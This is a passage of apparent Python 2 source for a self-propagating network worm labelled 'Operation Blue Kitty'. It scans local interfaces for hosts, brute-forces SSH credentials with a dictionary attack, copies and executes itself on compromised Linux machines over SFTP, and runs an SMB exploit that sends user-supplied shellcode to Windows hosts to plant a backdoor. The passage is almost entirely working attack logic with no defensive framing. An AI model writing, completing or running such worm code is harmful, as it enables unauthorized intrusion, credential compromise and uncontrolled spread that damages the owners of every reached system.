	if os.path.exists( INFECTED_MARKER_FILE ):
		print "\n" + INFECTED_MARKER_FILE + " file already exists. Please remove it to run " + sys.argv[0]
		sys.exit()

	# Mark Infected and Proceed with proceed with distributing worm
	try:
		print "\n[ ACTIVATING OPERATION BLUE KITTY ]"
		markInfected( )
	except:
		tagging_error = sys.exc_info()[0]
		print tagging_error

interface_list = netifaces.interfaces()
interface_list.remove( LOOPBACK_INTERFACE )

# Code to run scans and detect hosts on available interfaces
for interface in interface_list:
	print "\nNetwork Interface: ", interface

	# Fetch all network values required for nmap scanning

	ip, broadcast, network, cidr = network_values(interface)

	# Get hosts on the same network
	networkLinuxHosts = getLinuxHostsOnTheSameNetwork(ip, broadcast, network, cidr)
	networkWindowsHosts = getWindowsHostsOnTheSameNetwork(ip, broadcast, network, cidr)

	# Randomly shuffle hosts to make spread not predictable
	random.shuffle( networkLinuxHosts )
	random.shuffle( networkWindowsHosts )

	print "Linux Target on", interface, networkLinuxHosts
	print "Windows Target on", interface, networkWindowsHosts
	if len(networkWindowsHosts) > 0 and  len(sys.argv) < 2:
		print "\nWARNING: Please supply a payload for Windows SMB Exploit to implant worm plus backdoor on Windows Victim"

#############################################################################################################################################################################
# Linux SSH Dictionary Attack Main
#############################################################################################################################################################################
	# Go through the network Linux hosts
	for host in networkLinuxHosts:
		# Try to attack this host
		print "\nStarting SSH Dictionary Attack on", host
		sshInfo =  attackSSH( host )

		# Attack succeeded
		if sshInfo:
			print "Credentials for " + str(sshInfo[1]) + " : " + str(sshInfo[2]) + " / " + str(sshInfo[3])
			print "Connecting to " + str(sshInfo[1])

			# sshInfo[0] = <paramiko.client.SSHClient object at 0xb703758c>
			sftp_client = sshInfo[0].open_sftp()

			# Check if the system was already infected. This is done by checking whether the remote system contains /tmp/infected.txt file
			# which the worm will place there when it first infects the system

			if not isInfectedSystem( sftp_client ):
				# If the system was already infected proceed.
				# Otherwise, infect the system and terminate.
				# Infect that system
				try:
					print "worm.py replicated successfully"
					spreadAndExecute( sshInfo[0], sftp_client )
				except:
					infecting_error = sys.exc_info()[0]
					print infecting_error
			else:
				print "Worm already implanted on", str(sshInfo[1]) 
			sftp_client.close()


#############################################################################################################################################################################
# Windows SMB Exploit Main
#############################################################################################################################################################################
	#python2 worm.py sc_x64.bin
	#sys.argv[0]=worm.py
	#sys.argv[1]=sc_x64.bin
	#sys.argv[2]=[numGroomConn]

	# Go through the network Windows hosts
	if len(sys.argv) > 1:
		#print("{} <shellcode_file> [numGroomConn]".format(sys.argv[0]))
		#sys.exit(1)

		#TARGET=sys.argv[1]

		numGroomConn = 13 if len(sys.argv) < 3 else int(sys.argv[2])

		fp = open(sys.argv[1], 'rb')		 # read file in binary mode
		sc = fp.read()
		fp.close()

		for host in networkWindowsHosts:

			# print('\nshellcode size: {:d}'.format(len(sc)))
			# print('numGroomConn: {:d}'.format(numGroomConn))

			# Try to attack this host
			attackSMB(host, sc, numGroomConn)
